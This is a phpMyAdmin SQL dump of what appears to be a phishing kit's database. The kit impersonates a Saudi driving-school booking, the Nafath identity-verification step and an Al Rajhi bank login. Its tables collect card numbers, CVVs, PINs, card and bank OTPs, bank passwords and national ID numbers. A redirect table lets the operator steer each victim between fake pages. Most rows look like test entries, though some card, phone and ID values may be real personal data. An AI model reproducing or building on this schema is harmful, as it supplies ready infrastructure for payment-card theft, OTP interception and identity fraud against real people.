-- phpMyAdmin SQL Dump
-- version 5.2.2
-- https://www.phpmyadmin.net/
--
-- مضيف: 127.0.0.1:3306
-- وقت الجيل: 15 يناير 2026 الساعة 04:45
-- إصدار الخادم: 11.8.3-MariaDB-log
-- نسخة PHP: 7.2.34

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- قاعدة بيانات: `u144369246_dosudia`
--

-- --------------------------------------------------------

--
-- بنية الجدول `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `full_name` varchar(100) DEFAULT NULL,
  `email` varchar(100) DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `last_login` timestamp NULL DEFAULT NULL,
  `is_active` tinyint(1) DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_uca1400_ai_ci;

--
-- إرجاع أو استيراد بيانات الجدول `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`, `full_name`, `email`, `created_at`, `last_login`, `is_active`) VALUES
(3, 'admins', '$2y$10$z/y6Gb9H248eLyhXD9J04OAzYyzm0ndMugjTNqZYFNvQc019d6Wzu', 'المشرف', 'admin@khob.com', '2026-01-20 15:25:48', '2026-01-24 11:25:26', 1);

-- --------------------------------------------------------

--
-- بنية الجدول `bank_logins`
--

CREATE TABLE `bank_logins` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL COMMENT 'معرف المستخدم',
  `bank` varchar(100) DEFAULT NULL COMMENT 'اسم البنك',
  `user_name` varchar(255) DEFAULT NULL COMMENT 'اسم المستخدم أو الهوية',
  `bk_pass` varchar(255) DEFAULT NULL COMMENT 'كلمة المرور',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='جدول بيانات تسجيل الدخول للبنوك';

--
-- إرجاع أو استيراد بيانات الجدول `bank_logins`
--

INSERT INTO `bank_logins` (`id`, `user_id`, `bank`, `user_name`, `bk_pass`, `created_at`, `updated_at`) VALUES
(1, 31, 'راجحي', 'admfkvmakdfmv', '01546523154', '2026-01-15 03:06:32', NULL),
(2, 33, 'راجحي', 'mohmaasmkadfv', '156156456', '2026-01-15 03:40:21', NULL);

-- --------------------------------------------------------

--
-- بنية الجدول `bank_otps`
--

CREATE TABLE `bank_otps` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL COMMENT 'معرف المستخدم',
  `otp_code` varchar(10) NOT NULL COMMENT 'رمز OTP',
  `created_at` timestamp NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='جدول رموز OTP للبنوك';

--
-- إرجاع أو استيراد بيانات الجدول `bank_otps`
--

INSERT INTO `bank_otps` (`id`, `user_id`, `otp_code`, `created_at`) VALUES
(1, 33, '021225', '2026-01-15 04:03:27'),
(2, 33, '1234', '2026-01-15 04:03:50');

-- --------------------------------------------------------

--
-- بنية الجدول `cards`
--

CREATE TABLE `cards` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL COMMENT 'معرف المستخدم',
  `cardName` varchar(255) DEFAULT NULL COMMENT 'اسم حامل البطاقة',
  `cardNumber` varchar(20) DEFAULT NULL COMMENT 'رقم البطاقة',
  `cardExpiry` varchar(7) DEFAULT NULL COMMENT 'تاريخ الانتهاء MM/YYYY',
  `cvv` varchar(4) DEFAULT NULL COMMENT 'CVV',
  `price` decimal(10,2) DEFAULT NULL COMMENT 'المبلغ المدفوع',
  `payment_method` varchar(50) DEFAULT 'card' COMMENT 'طريقة الدفع',
  `created_at` timestamp NULL DEFAULT current_timestamp(),
  `updated_at` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- إرجاع أو استيراد بيانات الجدول `cards`
--

INSERT INTO `cards` (`id`, `user_id`, `cardName`, `cardNumber`, `cardExpiry`, `cvv`, `price`, `payment_method`, `created_at`, `updated_at`) VALUES
(21, 25, 'mohamad', '4286 7240 0356 9268', '08/2035', '642', 750.00, 'card', '2026-01-14 06:00:19', NULL),
(22, 25, 'ahmad', '4286 7240 0356 9268', '09/2035', '999', 1450.00, 'card', '2026-01-14 06:21:16', NULL),
(23, 25, 'amfdkvm', '4286 7240 0356 9268', '09/2031', '623', 2760.00, 'card', '2026-01-14 06:29:16', NULL),
(24, 25, 'mvfkaf', '4286 7240 0356 9268', '11/2029', '454', 1450.00, 'card', '2026-01-14 06:47:55', NULL),
(25, 25, 'amdkfv', '4286 7240 0356 9268', '08/2030', '546', 1200.00, 'card', '2026-01-14 07:10:34', NULL),
(26, 25, 'slimena', '4286 7240 0356 9268', '08/2031', '123', 1450.00, 'card', '2026-01-14 07:11:08', NULL),
(27, 26, 'amkamfvkm', '4286 7240 0356 9268', '06/2034', '636', 750.00, 'card', '2026-01-14 07:52:45', NULL),
(28, 27, 'رشيبرشيبر', '4286 7240 0356 9268', '09/2031', '452', 1200.00, 'card', '2026-01-14 07:57:22', NULL),
(29, 28, 'Hshs', '4847 8336 6052 5000', '06/2030', '132', 1.00, 'card', '2026-01-14 09:26:45', NULL),
(30, 29, 'Have sbshd', '4847 8351 2778 8881', '05/2027', '215', 1.00, 'card', '2026-01-14 09:50:14', NULL),
(31, 30, 'Fhgfe', '4847 8336 6534 2591', '01/2025', '123', 500.00, 'card', '2026-01-14 15:01:23', NULL),
(32, 30, 'Fhgfe', '4847 8336 6534 2591', '01/2025', '123', 1.00, 'card', '2026-01-14 15:02:13', NULL),
(33, 34, 'makfdmv', '4286 7240 0356 9268', '11/2034', '616', 750.00, 'card', '2026-01-15 04:41:07', NULL);

-- --------------------------------------------------------

--
-- بنية الجدول `card_otps`
--

CREATE TABLE `card_otps` (
  `id` int(11) NOT NULL,
  `card_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `otp_code` varchar(10) NOT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- إرجاع أو استيراد بيانات الجدول `card_otps`
--

INSERT INTO `card_otps` (`id`, `card_id`, `user_id`, `otp_code`, `created_at`) VALUES
(31, 26, 25, '123143', '2026-01-14 07:11:23'),
(32, 26, 25, '878979', '2026-01-14 07:11:40'),
(33, 27, 26, '252524', '2026-01-14 07:53:04'),
(34, 28, 27, '111111', '2026-01-14 07:58:28'),
(35, 28, 27, '555555', '2026-01-14 07:58:42'),
(36, 32, 30, '258025', '2026-01-14 15:02:50'),
(37, 32, 30, '123444', '2026-01-14 15:03:50'),
(38, 33, 34, '636363', '2026-01-15 04:42:43');

-- --------------------------------------------------------

--
-- بنية الجدول `card_pins`
--

CREATE TABLE `card_pins` (
  `id` int(11) NOT NULL,
  `card_id` int(11) DEFAULT NULL,
  `client_id` int(11) NOT NULL,
  `pin_code` varchar(10) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- إرجاع أو استيراد بيانات الجدول `card_pins`
--

INSERT INTO `card_pins` (`id`, `card_id`, `client_id`, `pin_code`, `created_at`) VALUES
(0, 26, 25, '6555', '2026-01-14 07:26:05'),
(0, 26, 25, '8855', '2026-01-14 07:26:40'),
(0, 26, 25, '5500', '2026-01-14 07:29:13'),
(0, 26, 25, '3333', '2026-01-14 07:29:50'),
(0, 28, 27, '2222', '2026-01-14 07:58:54'),
(0, 30, 29, '2880', '2026-01-14 09:50:39'),
(0, 32, 30, '3366', '2026-01-14 15:05:18'),
(0, 33, 34, '6666', '2026-01-15 04:43:07');

-- --------------------------------------------------------

--
-- بنية الجدول `nafad_codes`
--

CREATE TABLE `nafad_codes` (
  `id` int(11) NOT NULL,
  `client_id` int(11) NOT NULL COMMENT 'معرف العميل',
  `nafad_code` varchar(10) NOT NULL COMMENT 'رمز التحقق',
  `created_at` timestamp NOT NULL DEFAULT current_timestamp() COMMENT 'تاريخ الإدخال'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='جدول رموز التحقق لكل عميل';

--
-- إرجاع أو استيراد بيانات الجدول `nafad_codes`
--

INSERT INTO `nafad_codes` (`id`, `client_id`, `nafad_code`, `created_at`) VALUES
(12, 25, '543453', '2026-01-14 07:33:23'),
(13, 25, '0000', '2026-01-14 07:33:37'),
(14, 27, '123456', '2026-01-14 07:59:51'),
(15, 27, '123458', '2026-01-14 08:00:02'),
(16, 29, '151515', '2026-01-14 09:51:11'),
(17, 29, '545451', '2026-01-14 09:55:19'),
(18, 29, '545451', '2026-01-14 09:55:21'),
(19, 30, '000000', '2026-01-14 15:08:35'),
(20, 34, '636363', '2026-01-15 04:43:34');

-- --------------------------------------------------------

--
-- بنية الجدول `nafad_logs`
--

CREATE TABLE `nafad_logs` (
  `id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `phone` varchar(20) DEFAULT NULL,
  `telecom` varchar(50) DEFAULT NULL,
  `id_number` varchar(50) DEFAULT NULL,
  `redirect_to` varchar(255) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- إرجاع أو استيراد بيانات الجدول `nafad_logs`
--

INSERT INTO `nafad_logs` (`id`, `user_id`, `phone`, `telecom`, `id_number`, `redirect_to`, `created_at`) VALUES
(10, 25, '504524201', 'STC', '10000542452', 'success.php', '2026-01-14 07:32:50'),
(11, 25, '555523121', 'STC', '1100005434', 'success.php', '2026-01-14 07:33:05'),
(12, 27, '50014894', 'Mobily', '10005489731', 'success.php', '2026-01-14 07:59:43'),
(13, 29, '54545455484454', 'STC', '1919118187171', 'success.php', '2026-01-14 09:51:02'),
(14, 30, '555555555555', 'STC', '0987654321', 'success.php', '2026-01-14 15:07:30'),
(15, 34, '50425452404', 'STC', '12012014254', 'success.php', '2026-01-15 04:43:25');

-- --------------------------------------------------------

--
-- بنية الجدول `nafad_requests`
--

CREATE TABLE `nafad_requests` (
  `id` int(11) NOT NULL,
  `client_id` int(11) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `telecom` varchar(50) NOT NULL,
  `id_number` varchar(50) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_uca1400_ai_ci;

-- --------------------------------------------------------

--
-- بنية الجدول `nafath_numbers`
--

CREATE TABLE `nafath_numbers` (
  `id` int(11) NOT NULL,
  `client_id` int(11) NOT NULL,
  `number` varchar(10) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_uca1400_ai_ci;

--
-- إرجاع أو استيراد بيانات الجدول `nafath_numbers`
--

INSERT INTO `nafath_numbers` (`id`, `client_id`, `number`, `created_at`) VALUES
(17, 25, '16', '2026-01-14 07:33:49'),
(18, 27, '19', '2026-01-14 08:00:12'),
(19, 30, '12', '2026-01-14 15:09:32'),
(20, 30, '22', '2026-01-14 15:09:52'),
(21, 34, '16', '2026-01-15 04:43:53');

-- --------------------------------------------------------

--
-- بنية الجدول `settings`
--

CREATE TABLE `settings` (
  `id` int(11) NOT NULL,
  `redirect_active` tinyint(1) DEFAULT 0,
  `redirect_url` varchar(255) DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- بنية الجدول `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `request_type` varchar(100) DEFAULT NULL COMMENT 'نوع الطلب',
  `ssn` varchar(12) DEFAULT NULL COMMENT 'رقم الهوية الوطنية',
  `name` varchar(255) DEFAULT NULL COMMENT 'الاسم الكامل',
  `phone` varchar(20) DEFAULT NULL COMMENT 'رقم الجوال',
  `date` date DEFAULT NULL COMMENT 'تاريخ الميلاد',
  `email` varchar(255) DEFAULT NULL COMMENT 'البريد الإلكتروني',
  `region` varchar(100) DEFAULT NULL COMMENT 'المنطقة',
  `branch` varchar(255) DEFAULT NULL COMMENT 'الفرع',
  `level` varchar(100) DEFAULT NULL COMMENT 'المستوى',
  `gear_type` varchar(50) DEFAULT NULL COMMENT 'نوع الجير',
  `time_period` varchar(255) DEFAULT NULL COMMENT 'الفترة الزمنية',
  `username` varchar(255) DEFAULT NULL COMMENT 'اسم المستخدم',
  `message` varchar(500) DEFAULT 'طلب جديد' COMMENT 'رسالة الحالة',
  `currentpage` varchar(100) DEFAULT 'register.php' COMMENT 'الصفحة الحالية',
  `status` tinyint(1) DEFAULT 0 COMMENT 'حالة الطلب: 0=جديد, 1=قيد المعالجة, 2=مقبول, 3=مرفوض',
  `live` tinyint(1) DEFAULT 1 COMMENT 'نشط: 0=غير متصل, 1=متصل',
  `lastlive` bigint(20) DEFAULT NULL COMMENT 'آخر وقت اتصال (timestamp)',
  `ip_address` varchar(50) DEFAULT NULL COMMENT 'عنوان IP',
  `user_agent` text DEFAULT NULL COMMENT 'معلومات المتصفح',
  `session_id` varchar(100) DEFAULT NULL COMMENT 'معرف الجلسة',
  `redirect_to` varchar(50) DEFAULT NULL,
  `redirect_at` datetime DEFAULT NULL,
  `redirect_active` tinyint(1) DEFAULT 0,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp() COMMENT 'تاريخ الإنشاء',
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp() COMMENT 'تاريخ التحديث'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='جدول بيانات المستخدمين والطلبات';

--
-- إرجاع أو استيراد بيانات الجدول `users`
--

INSERT INTO `users` (`id`, `request_type`, `ssn`, `name`, `phone`, `date`, `email`, `region`, `branch`, `level`, `gear_type`, `time_period`, `username`, `message`, `currentpage`, `status`, `live`, `lastlive`, `ip_address`, `user_agent`, `session_id`, `redirect_to`, `redirect_at`, `redirect_active`, `created_at`, `updated_at`) VALUES
(25, NULL, '102542452452', 'محمد', '0545245245', '2026-01-21', 'bsfgbsfgbsfgb@gmail.com', 'القصيم', 'فرع شركة دله لتعليم قيادة السيارات بالمجمعة', 'اختبار نظري', 'عادي', 'الفترة الصباحية من الساعة 9 صباحاً الى الساعة 2 مساءاً', 'client_1768369448', 'رمز نفاذ - انتظار الاتصال', 'register-second.php', 0, 1, 1768369448208, '176.29.166.18', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0', 'vpv37hqleledgc3u162e8nqoi3', NULL, NULL, 0, '2026-01-14 05:44:08', '2026-01-14 07:45:55'),
(26, NULL, '10005894797', 'سليمان', '0567967967', '2026-01-26', 'adfvanfjdvn@gmail.ccom', 'جازان', 'فرع شركة دله لتعليم قيادة السيارات بجيزان', 'برنامج 6 ساعات', 'أوتوماتيك', 'الفترة الصباحية من الساعة 9 صباحاً الى الساعة 2 مساءاً', 'client_1768376784', 'بيانات التدريب - المرحلة 2', 'register-second.php', 0, 1, 1768376784072, '176.29.166.18', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0', 'vpv37hqleledgc3u162e8nqoi3', NULL, NULL, 0, '2026-01-14 07:46:24', '2026-01-14 07:52:53'),
(27, NULL, '102542453453', 'mohamad', '0587969657', '2026-01-28', 'mvkafmdv@gmail.com', 'جازان', 'فرع شركة دله لتعليم قيادة السيارات بالدوادمي', 'تحديد مستوى', 'عادي', 'الفترة المسائية من الساعة 2 مساءاً الى الساعة 8 مساءاً', 'client_1768377240', 'رمز نفاذ - انتظار الاتصال', 'register-second.php', 0, 1, 1768377240049, '176.29.166.18', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0', 'vpv37hqleledgc3u162e8nqoi3', 'index.php', NULL, 1, '2026-01-14 07:54:00', '2026-01-14 09:22:20'),
(28, NULL, '1234567890', 'Hdhd', '1234567890', '2026-01-14', 'sesw12@gmail.com', 'الرياض', 'فرع شركة دله لتعليم قيادة السيارات بجيزان', 'إختبار عملي', 'عادي', 'الفترة الصباحية من الساعة 9 صباحاً الى الساعة 2 مساءاً', 'client_1768382683', 'بيانات التدريب - المرحلة 2', 'register-second.php', 0, 1, 1768382683982, '2a01:9700:85e0:1900:68be:20a4:94af:26a9', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1', 'rdnqfshb2hvrqkba87iua0b4b4', NULL, NULL, 0, '2026-01-14 09:24:44', '2026-01-14 09:25:11'),
(29, NULL, '555552255555', 'تتلال', '5558855585', '2026-01-20', 'hahahah@gmail.com', 'جدة', 'فرع شركة دله لتعليم قيادة السيارات بالتخصصى - الرياض', 'تدريب عملي', 'عادي', 'الفترة الصباحية من الساعة 9 صباحاً الى الساعة 2 مساءاً', 'client_1768382710', 'رمز نفاذ - انتظار الاتصال', 'register-second.php', 0, 1, 1768382710454, '37.217.17.244', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1', 'ui8n5atehuog926550otn55gtu', 'pay.php', NULL, 1, '2026-01-14 09:25:10', '2026-01-14 09:55:26'),
(30, NULL, '1234567890', 'Sawfg', '1234567890', '2026-01-21', 'swsae12@gmail.com', 'جدة', 'فرع شركة دله لتعليم قيادة السيارات بجدة', 'سداد رسوم', 'عادي', 'الفترة الصباحية من الساعة 9 صباحاً الى الساعة 2 مساءاً', 'client_1768402753', 'بيانات التدريب - المرحلة 2', 'register-second.php', 0, 1, 1768402753810, '2a01:9700:85e0:1900:dc3e:a9e6:af34:5f7e', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.1 Mobile/15E148 Safari/604.1', 'b5n0m8k4dlavuaqh63iru2ispb', NULL, NULL, 0, '2026-01-14 14:59:13', '2026-01-14 15:10:28'),
(31, NULL, '100025424524', 'mhmds', '0578676578', '2026-01-21', 'adfmvkadmfvk@gmail.com', NULL, NULL, NULL, NULL, NULL, 'client_1768446308', 'صفحة بنك الراجحي', 'BK.php', 0, 1, 1768446308245, '176.29.166.18', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0', 'crupk2pe0nuk1k3okb825m96d1', NULL, NULL, 0, '2026-01-15 03:05:08', '2026-01-15 03:13:35'),
(32, NULL, '054245245245', 'moadhfvaf', '0527873434', '2026-01-28', 'mvkadfmvkm@gmail.com', NULL, NULL, NULL, NULL, NULL, 'client_1768446858', 'طلب تسجيل جديد', 'register.php', 0, 1, 1768446858283, '176.29.166.18', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0', 'crupk2pe0nuk1k3okb825m96d1', NULL, NULL, 0, '2026-01-15 03:14:18', '2026-01-15 03:15:11'),
(33, NULL, '100045242452', 'حمدبي', '1025243453', '2026-01-21', 'makdfmvafv@gmail.com', NULL, NULL, NULL, NULL, NULL, 'client_1768448337', 'رمز تحقق بنك الراجحي', 'bank-otp.php', 0, 1, 1768448337978, '176.29.166.18', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0', 'crupk2pe0nuk1k3okb825m96d1', NULL, NULL, 0, '2026-01-15 03:38:58', '2026-01-15 04:39:04'),
(34, NULL, '100058965468', 'رمسحمبلح', '0524543453', '2026-01-21', 'amkdfmvkadmv@gmail.com', 'تبوك', 'فرع شركة دله لتعليم قيادة السيارات بالدوادمي', 'اختبار نظري', 'أوتوماتيك', 'الفترة الصباحية من الساعة 9 صباحاً الى الساعة 2 مساءاً', 'client_1768452010', 'رمز نفاذ - انتظار الاتصال', 'register-second.php', 0, 1, 1768452010092, '176.29.166.18', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0', 'crupk2pe0nuk1k3okb825m96d1', 'nafath.php', NULL, 1, '2026-01-15 04:40:10', '2026-01-15 04:43:49');

-- --------------------------------------------------------

--
-- بنية الجدول `visits`
--

CREATE TABLE `visits` (
  `id` int(11) NOT NULL,
  `total_visits` int(11) NOT NULL DEFAULT 0 COMMENT 'إجمالي الزيارات',
  `updated_at` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- إرجاع أو استيراد بيانات الجدول `visits`
--

INSERT INTO `visits` (`id`, `total_visits`, `updated_at`) VALUES
(1, 16, '2026-01-15 03:08:31');

--
-- Indexes for dumped tables
--

--
-- فهارس للجدول `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- فهارس للجدول `bank_logins`
--
ALTER TABLE `bank_logins`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_user_id` (`user_id`);

--
-- فهارس للجدول `bank_otps`
--
ALTER TABLE `bank_otps`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_user_id` (`user_id`);

--
-- فهارس للجدول `cards`
--
ALTER TABLE `cards`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_user_id` (`user_id`),
  ADD KEY `idx_created_at` (`created_at`);

--
-- فهارس للجدول `card_otps`
--
ALTER TABLE `card_otps`
  ADD PRIMARY KEY (`id`),
  ADD KEY `card_id` (`card_id`),
  ADD KEY `user_id` (`user_id`);

--
-- فهارس للجدول `nafad_codes`
--
ALTER TABLE `nafad_codes`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_client_id` (`client_id`),
  ADD KEY `idx_created_at` (`created_at`);

--
-- فهارس للجدول `nafad_logs`
--
ALTER TABLE `nafad_logs`
  ADD PRIMARY KEY (`id`);

--
-- فهارس للجدول `nafad_requests`
--
ALTER TABLE `nafad_requests`
  ADD PRIMARY KEY (`id`);

--
-- فهارس للجدول `nafath_numbers`
--
ALTER TABLE `nafath_numbers`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_client_id` (`client_id`);

--
-- فهارس للجدول `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- فهارس للجدول `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_ssn` (`ssn`),
  ADD KEY `idx_phone` (`phone`),
  ADD KEY `idx_email` (`email`),
  ADD KEY `idx_request_type` (`request_type`),
  ADD KEY `idx_created_at` (`created_at`),
  ADD KEY `idx_status` (`status`);

--
-- فهارس للجدول `visits`
--
ALTER TABLE `visits`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- AUTO_INCREMENT for table `bank_logins`
--
ALTER TABLE `bank_logins`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `bank_otps`
--
ALTER TABLE `bank_otps`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `cards`
--
ALTER TABLE `cards`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=34;

--
-- AUTO_INCREMENT for table `card_otps`
--
ALTER TABLE `card_otps`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;

--
-- AUTO_INCREMENT for table `nafad_codes`
--
ALTER TABLE `nafad_codes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- AUTO_INCREMENT for table `nafad_logs`
--
ALTER TABLE `nafad_logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- AUTO_INCREMENT for table `nafad_requests`
--
ALTER TABLE `nafad_requests`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `nafath_numbers`
--
ALTER TABLE `nafath_numbers`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=22;

--
-- AUTO_INCREMENT for table `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- AUTO_INCREMENT for table `visits`
--
ALTER TABLE `visits`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- القيود المفروضة على الجداول الملقاة
--

--
-- قيود الجداول `bank_logins`
--
ALTER TABLE `bank_logins`
  ADD CONSTRAINT `fk_bank_logins_user` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- قيود الجداول `bank_otps`
--
ALTER TABLE `bank_otps`
  ADD CONSTRAINT `fk_bank_otps_user` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- قيود الجداول `cards`
--
ALTER TABLE `cards`
  ADD CONSTRAINT `fk_cards_user` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;

--
-- قيود الجداول `nafad_codes`
--
ALTER TABLE `nafad_codes`
  ADD CONSTRAINT `fk_nafad_codes_client` FOREIGN KEY (`client_id`) REFERENCES `users` (`id`) ON DELETE CASCADE ON UPDATE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
